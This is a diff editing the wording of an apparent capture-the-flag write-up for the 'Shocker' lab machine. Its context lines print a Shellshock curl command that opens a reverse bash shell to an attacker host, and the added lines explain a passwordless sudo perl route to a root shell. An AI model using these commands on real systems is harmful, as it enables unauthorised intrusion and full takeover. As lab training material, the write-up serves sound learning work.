@@ -109,7 +109,7 @@ Just an uptime test script
 
 ```
 
-Well, nothing usefull in itself, but what it does mean (cgi-bin accessible), is that this installation of Apache may well be vulnerable to a Shellshock exploit.
+Well, nothing usefull in itself, but what it does mean (cgi-bin accessible), is that this installation of Apache will likely be vulnerable to a Shellshock exploit.
 
 ```
 
@@ -117,7 +117,7 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.34/6969 0>&1' 
 
 ```
 
-This attempt works straight off the bat...Google Shellshock if you need to find out what it is...Its an important vulnerability to know about.
+This attempt works straight off the bat...Shellshock is  an important vulnerability to know about.
 [Wiki on shellshock](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29)
 
 ###############################################################
@@ -138,7 +138,8 @@ User shelly may run the following commands on Shocker:
 ```
 
 sudo -l is always one of the first commands I try when I get an user shell, for this sort of reason.
-Getting root now is very simple.
+Getting root now is very simple. Shelly can execute a perl command or script using sudo (which gives 'super user' privileges) without having to enter a password.
+We can use this to invoke a bash shell that will reflect the privileges of the user that called it. Since sudo commands are run 'as root', the resulting shell will be a root shell.
 
 ```
 
